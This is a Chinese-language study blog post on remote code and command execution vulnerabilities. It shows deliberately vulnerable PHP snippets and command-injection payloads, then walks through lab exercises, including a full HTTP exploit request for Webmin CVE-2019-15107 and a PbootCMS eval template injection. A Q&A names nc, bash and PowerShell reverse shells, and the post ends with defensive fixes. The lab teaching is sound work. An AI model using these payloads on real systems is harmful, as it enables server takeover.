---
title: RCE漏洞
date: 2026-06-08 15:00:00
cover: https://img.jasmine-iris.top/posts/RCE漏洞/cover.webp
categories:
  - Web安全
  - RCE
tags:
  - RCE
description: 远程代码/命令执行漏洞（RCE）的原理、常见危险函数、利用方式与防御措施
---

# 一、RCE简介与危害
+ RCE：Remote Code/Command Execution，分为**远程代码执行、远程命令执行**。
+ 成因：开发使用可执行代码/系统命令的函数，函数入参用户可控且无过滤，触发漏洞。
+ 危害：攻击者直接在服务器执行系统指令，完全接管服务器权限。
+ 案例：
1. 远程代码执行（eval函数示例）

```php
<?php
$code=$_GET['x'];
eval($code);
?>
```

测试payload：

> `http://localhost/1.php?x=phpinfo();`
>
> `http://localhost/1.php?x=echo%20abc;`
>

![](https://img.jasmine-iris.top/posts/RCE漏洞/1786548462485_czf38u.png)

![](https://img.jasmine-iris.top/posts/RCE漏洞/1786548465195_dczjiw.png)

2. 远程命令执行（system函数示例）

```php
<?php
$code=$_GET['x'];
echo system($code);
?>
```

测试payload

1. `http://localhost/2.php?x=ipconfig`

![](https://img.jasmine-iris.top/posts/RCE漏洞/1786548467012_vcu1ml.png)

2. `http://localhost/2.php?x=whoami`

---

# 二、墨者学院靶场
[https://mozhe.cn/](https://mozhe.cn/)

## 案例1：Ping命令注入
（靶场：[https://mozhe.cn/bug/detail/12](https://mozhe.cn/bug/detail/12)）

![](https://img.jasmine-iris.top/posts/RCE漏洞/1786548469373_26l3yh.png)

1. 页面输入`127.0.0.1`正常ping

![](https://img.jasmine-iris.top/posts/RCE漏洞/1786548472301_u5rjyl.png)

2. 确认系统

![](https://img.jasmine-iris.top/posts/RCE漏洞/1786548474388_pc0ucw.png)

3. 前端JS限制IP格式，前端过滤可绕过。

![](https://img.jasmine-iris.top/posts/RCE漏洞/1786548476578_z7iola.png)

4. Burp抓包修改POST参数：`iipp=127.0.0.1|ls&submit=Ping`，`|`为命令拼接符，前命令执行完执行后续ls。

![](https://img.jasmine-iris.top/posts/RCE漏洞/1786548479385_rfwyd2.png)

5. 查看返回目录：index.php、key_xxxx.php。

![](https://img.jasmine-iris.top/posts/RCE漏洞/1786548481962_zwgo9p.png)

6. 最终payload：`iipp=127.0.0.1|cat<key_32507850714807.php&submit=Ping`，读取key值。

![](https://img.jasmine-iris.top/posts/RCE漏洞/1786548485301_1awdsl.png)

> 注：命令分隔符有`|、||、&、&&、;`
>

---

## 案例2 PHP反引号命令执行
（靶场：[https://mozhe.cn/bug/detail/13](https://mozhe.cn/bug/detail/13)）

![](https://img.jasmine-iris.top/posts/RCE漏洞/1786548487897_qmsyk3.png)

![](https://img.jasmine-iris.top/posts/RCE漏洞/1786548490664_ajoa9t.png)

1. 解析代码，使⽤php

注意： PHP 要求字符串字面量必须用单引号（`'`）或双引号（`"`）括起来  

```php
<?php 
  print(gzinflate(base64_decode("&40pNzshXSFCJD3INDHUNDolOjE2wtlawt+MCAA==&"))); 
?>  
```

新建一个 2.php 文件，把这段代码粘贴进去。再把文件放到 phpstudy 的网站根目录，访问。

![](https://img.jasmine-iris.top/posts/RCE漏洞/1786548492005_v1rl2y.png)

PHP中``内容``反引号内内容会被当作系统shell命令执行。

```php
<?php
echo `$_REQUEST[a]`;
?>
```

2. payload1：`?a=ls` 列出当前目录，发现key文件。

![](https://img.jasmine-iris.top/posts/RCE漏洞/1786548493441_xvptd4.png)

3. payload2：`?a=cat<key_5358811711226.php` 读取key内容。

![](https://img.jasmine-iris.top/posts/RCE漏洞/1786548495297_2nyjgv.png)

---

## 案例3 CVE-2019-15107 Webmin RCE漏洞
### (1) Webmin 介绍
Webmin是用于管理类Unix系统的管理配置工具，拥有Web页面。该漏洞出现在password_change.cgi的密码重置功能处，因为缺少输入验证，恶意第三方可以传入恶意参数执行恶意代码。

[https://mozhe.cn/bug/detail/309](https://mozhe.cn/bug/detail/309)

### (2) 部署
```bash
sudo su
cd /home/enjoy/vulhub-master/webmin/CVE-2019-15107/
docker-compose build
docker-compose up -d
docker-compose down
```

漏洞点：`password_change.cgi`密码重置页面参数可控，old参数可拼接系统命令。

### (3) 操作
![](https://img.jasmine-iris.top/posts/RCE漏洞/1786548498529_pthidy.png)

![](https://img.jasmine-iris.top/posts/RCE漏洞/1786548501245_ceega2.png)

![](https://img.jasmine-iris.top/posts/RCE漏洞/1786548503245_39juja.png)

![](https://img.jasmine-iris.top/posts/RCE漏洞/1786548505468_dr3lfv.png)



![](https://img.jasmine-iris.top/posts/RCE漏洞/1786548507870_5d9t38.png)

1. 登录拦截

![](https://img.jasmine-iris.top/posts/RCE漏洞/1786548509761_8thx6r.png)

2. 漏洞测试：利用数据包

```http
POST /password_change.cgi HTTP/1.1
Host: 182.44.114.36:46542
Cookie: redirect=1;testing=1; sid=x; sessiontest=1
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Dnt: 1
Referer: https://182.44.114.36:46542/session_login.cgi
Content-Type: application/x-www-form-urlencoded
Content-Length: 62
Connection: keep-alive


user=rootxx&pam=&expired=2&old=test|id&new1=test2&new2=test2
```

Host: 靶机IP:端口	改成自己的

常用 Payload

+ `old=test|id` 执行id查看当前用户
+ `old=test|ls /` 列出根目录文件
+ `old=test|cat /key.txt` 读取根目录key

![](https://img.jasmine-iris.top/posts/RCE漏洞/1786548511818_a38c3w.png)

3. 获取 cookie

![](https://img.jasmine-iris.top/posts/RCE漏洞/1786548513714_b2c2hn.png)

![](https://img.jasmine-iris.top/posts/RCE漏洞/1786548515982_tlbv1b.png)

![](https://img.jasmine-iris.top/posts/RCE漏洞/1786548518007_qm23ua.png)

---

## 案例4 PbootCMS代码执行漏洞
靶场下载：

{% gitee_file PbootCMS-1.1.4.zip https://gitee.com/jasminee0762/cyber-security/blob/master/%E9%9D%B6%E5%9C%BA/RCE/PbootCMS-1.1.4.zip %}

![](https://img.jasmine-iris.top/posts/RCE漏洞/1786548520627_yv5uap.png)

### (1) 漏洞分析
漏洞成因：页面`{pboot:if(eval($_POST[1]))}`标签解析，POST参数1可控。

审计⼯具查询危险函数：

![](https://img.jasmine-iris.top/posts/RCE漏洞/1786548524403_7ue5zg.png)

![](https://img.jasmine-iris.top/posts/RCE漏洞/1786548526840_g3nqjg.png)

![](https://img.jasmine-iris.top/posts/RCE漏洞/1786548529503_5jwhzl.png)

![](https://img.jasmine-iris.top/posts/RCE漏洞/1786548531999_4fx0xm.png)

```http
eval('if(' . $matches[1][$i] . '){$flag="if";}else{$flag="else";}');
```

### (2) 操作
1. 在线留言

![](https://img.jasmine-iris.top/posts/RCE漏洞/1786548535134_wv52ah.png)

```http
 AboutController ： {pboot:if(eval($_POST[1]))}!!!{/pboot:if}  
```

![](https://img.jasmine-iris.top/posts/RCE漏洞/1786548537406_c665kq.png)

![](https://img.jasmine-iris.top/posts/RCE漏洞/1786548539299_fyxwet.png)

![](https://img.jasmine-iris.top/posts/RCE漏洞/1786548541727_dodcgk.png)

2. 登录后台：admin.php

![](https://img.jasmine-iris.top/posts/RCE漏洞/1786548543134_fccghg.png)

账号：admin 密码：1234556

![](https://img.jasmine-iris.top/posts/RCE漏洞/1786548545638_vre8su.png)

![](https://img.jasmine-iris.top/posts/RCE漏洞/1786548548006_hkr4ph.png)

3. 访问首页：`http://localhost/pcms/index.php/about/10.html`
4. POST传参：`1=phpinfo();`，触发eval执行代码。

![](https://img.jasmine-iris.top/posts/RCE漏洞/1786548550542_rvc1fp.png)

---

# 三、RCE漏洞防御方案
1. 危险函数入参做严格黑名单/白名单过滤，过滤`| & ; $ > <`等命令拼接符号。
2. 尽量避免使用`eval、system、exec、shell_exec、``反引号`等高危执行函数。
3. 若业务必须使用命令执行函数，采用escapeshellarg/escapeshellcmd对输入转义过滤。![](https://img.jasmine-iris.top/posts/RCE漏洞/1786548552647_wv7dsr.png)

---

# 四、总结
## Q1：命令执行漏洞是什么？分别叫什么？
remote command execution 远程命令执行

remote code execution 远程代码执行

## Q2：命令执行漏洞的危害是什么？
执行系统命令

权限：一般情况下。RCE 漏洞的权限是 web 服务进程运行的权限（如 apache 进程权限 www-data）

查看权限的命令

Linux 查看权限：id

Windows 查看权限：whoami /all 或 whoami /priv

## Q3：如何挖掘 RCE 漏洞？
黑盒测试：除了 CTF、靶场以外，现实中无法通过黑盒挖掘命令执行漏洞，大部分都是靠扫描器（X-RAY），对于 RCE 漏洞都是只扫描历史漏洞

## Q4：如果给源代码，如何进行代审？
通过找命令执行函数

例如：

+ system：执行系统命令，自带输出结果。
+ shell_exec：执行系统命令，不会自动输出结果，需要编写 echo 语句输出。
    - 例如： echo shell_exec($cmd);
+ exec：执行系统命令，不会自动输出结果，需要编写 echo 语句输出，但只能输出最后一行。
    - 例如： echo exec($cmd);
+ passthru：执行系统命令，自带输出结果。
+ popen：执行系统命令，不会自动输出结果，需要把结果导出到文本文件中，在读取文本文件中保存好的命令执行结果。
+ `(反引号）：执行系统命令，不会自动输出结果，需要编写 echo 语句输出，和shell_exec 一致。

## Q5：RCE漏洞中，命令拼接符有哪些？
&&		||	|	;（Windows 不支持）	&

## Q6：如何反弹 shell？
1. nc 反弹 shell
2. bash 反弹 shell
3. （Windows）powershell 反弹shell	[Online - Reverse Shell Generator](https://www.revshells.com/)

## Q7：如何修复 RCE 漏洞？
1. 后端限制用户输入的内容格式，如输入 ip（验证用户输入的是不是 ip）
2. php 自带函数（禁用）[PHP: escapeshellarg - Manual](https://www.php.net/manual/zh/function.escapeshellarg.php)
3. 在给源代码的情况下，找 PHP 配置中的 disable_functions=shell_exec、system、exec、passthru、popen